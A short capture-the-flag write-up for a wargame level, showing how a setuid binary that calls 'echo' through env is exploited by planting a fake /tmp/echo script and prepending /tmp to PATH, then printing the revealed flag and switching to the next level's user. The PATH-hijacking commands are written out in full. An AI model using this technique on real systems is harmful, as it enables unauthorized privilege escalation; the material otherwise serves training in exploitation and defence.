

# **Level03**

### **Walk through**

For this level, we see that we have a binary in our home. We try to run it:

`./level03` and it gives us `Exploit me`

A good start could be to `strings level03`. This command output a lot of lines. Among them , we can read:

**`/usr/bin/env echo Exploit me`**

So we can suppose that the binary probably call `echo` a some point.

The idea here is to create a program (or a script) called `echo`. Its purpose would be to execute `getflag`. To do so we will execute the following commands:

`echo "/bin/sh -c 'getflag'" > /tmp/echo`  
`chmod +x /tmp/echo`  

Now we have to modify the path to be sure that level03 runs our echo.

`export PATH=/tmp:$PATH`

By adding the directory `/tmp/` at the beginning of path, our echo will be executed "first". The exploit works.

`./level03`  gives us **`qi0maab88jeaj46qoumi7maus`**

We will use it to log as level04

`su level04`
